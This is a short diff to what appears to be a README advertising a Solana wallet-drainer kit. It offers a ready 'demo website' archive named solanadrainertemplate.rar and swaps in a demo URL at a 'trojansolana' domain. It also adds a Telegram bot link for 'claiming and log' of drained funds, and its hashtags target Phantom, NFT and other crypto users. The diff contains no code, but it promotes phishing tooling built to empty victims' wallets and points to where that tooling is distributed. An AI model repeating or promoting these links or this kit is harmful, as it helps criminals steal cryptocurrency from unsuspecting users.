@@ -28,7 +28,8 @@ Upload your website on Vercel or any Hosting
 
 # WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : solanadrainertemplate.rar
 
-# DEMO WEBSITE : https://soilverse.vercel.app
+# DEMO WEBSITE : https://www.trojansolana.xyz
+# DRAINER BOT FOR CLAIMING AND LOG : https://t.me/vortexhitsbot
 
 #SOLANA #PHANTOM #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
